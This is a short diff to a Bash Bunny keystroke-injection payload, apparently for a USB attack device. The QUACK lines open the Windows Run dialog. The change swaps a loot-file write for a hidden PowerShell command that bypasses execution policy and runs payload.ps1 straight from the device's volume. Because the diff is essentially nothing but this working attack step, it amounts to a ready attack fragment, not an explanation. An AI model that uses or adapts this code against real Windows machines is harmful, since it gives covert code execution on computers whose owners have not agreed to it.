@@ -37,7 +37,8 @@ fi
 
 QUACK GUI r
 QUACK DELAY 250
-QUACK STRING "cmd /c type nul>D:/loot/WINDOWS.txt"
+#QUACK STRING "WINDOWS" | Out-File -Encoding Ascii -append ((gwmi win32_volume -f 'label=''BashBunny''').Name+'loot\OS.txt')
+QUACK STRING powershell -NoP -NonI -W Hidden -Exec Bypass -c ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\switch1\payload.ps1')"
 QUACK DELAY 250
 QUACK ENTER
 
